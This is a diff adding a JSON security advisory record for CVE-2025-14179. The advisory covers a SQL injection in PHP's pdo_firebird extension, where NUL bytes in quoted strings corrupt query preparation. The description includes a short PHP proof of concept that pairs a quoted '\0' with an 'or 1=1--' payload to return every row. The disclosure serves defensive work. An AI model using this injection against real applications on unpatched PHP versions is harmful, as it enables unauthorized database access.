@@ -1,0 +1,74 @@
+{
+  "global": null,
+  "id": "GHSA-w476-322c-wpvm",
+  "repo": {
+    "cve_id": "CVE-2025-14179",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.2,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      }
+    },
+    "cwe_ids": [
+      "CWE-89"
+    ],
+    "description": "Improper handling of NUL bytes during the preparation of Firebird SQL queries leads to sections of the of the query being dropped. NUL bytes can find their way into queries even under regular circumstances via `PDO::quote()`.\r\n\r\nhttps://github.com/php/php-src/blob/046ffa257581d6f1a709e9fbc4638793c2ac7e22/ext/pdo_firebird/firebird_driver.c#L437-L442\r\n\r\nA new query is constructed token-by-token. In the case of a `ttString` `'\\0'`, the string is copied via `strncat()` rather than `memcpy()`, stopping after the first `'` quote and ignoring both the `\\0` and terminating `'` quote. This will incorrectly embed the SQL tokens following the string into the string, allowing for trivial SQL injection if the next string is also attacker-controlled.\r\n\r\n```php\r\n$dbh->exec('CREATE TABLE users (name VARCHAR(255))');\r\n$dbh->exec(\"INSERT INTO users VALUES ('Foo')\");\r\n$dbh->exec(\"INSERT INTO users VALUES ('Bar')\");\r\n\r\n$param = $dbh->quote(\"\\0\");\r\n$param2 = $dbh->quote('or 1=1--');\r\n\r\n$stmt = $dbh->query(\"SELECT * FROM users WHERE name = {$param} AND name = {$param2}\");\r\n\r\n// Before preparation:\r\n// SELECT * FROM users WHERE name = '\\0' AND name = 'or 1=1--'\r\n\r\n// After preparation:\r\n// SELECT * FROM users WHERE name = ' AND name = 'or 1=1--'\r\n\r\necho json_encode($stmt->fetchAll(PDO::FETCH_ASSOC)) . \"\\n\";\r\n// [{\"NAME\":\"Foo\"},{\"NAME\":\"Bar\"}]\r\n```\r\n\r\nThis incorrect preparation applies to `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `MERGE`, `WITH` and `EXECUTE` statements.\r\n\r\n## Credits\r\nAleksey Solovev, Nikita Sveshnikov (Positive Technologies)",
+    "ghsa_id": "GHSA-w476-322c-wpvm",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-w476-322c-wpvm",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-w476-322c-wpvm"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2025-14179"
+      }
+    ],
+    "published_at": "2026-05-07T12:55:05Z",
+    "references": [],
+    "severity": "high",
+    "summary": "SQL injection in pdo_firebird via NUL bytes in quoted strings",
+    "updated_at": "2026-05-07T12:55:06Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-pdo_firebird"
+        },
+        "patched_versions": "8.2.31",
+        "vulnerable_version_range": "< 8.2.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-pdo_firebird"
+        },
+        "patched_versions": "8.3.31",
+        "vulnerable_version_range": "< 8.3.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-pdo_firebird"
+        },
+        "patched_versions": "8.4.21",
+        "vulnerable_version_range": "< 8.4.21"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-pdo_firebird"
+        },
+        "patched_versions": "8.5.6",
+        "vulnerable_version_range": "< 8.5.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
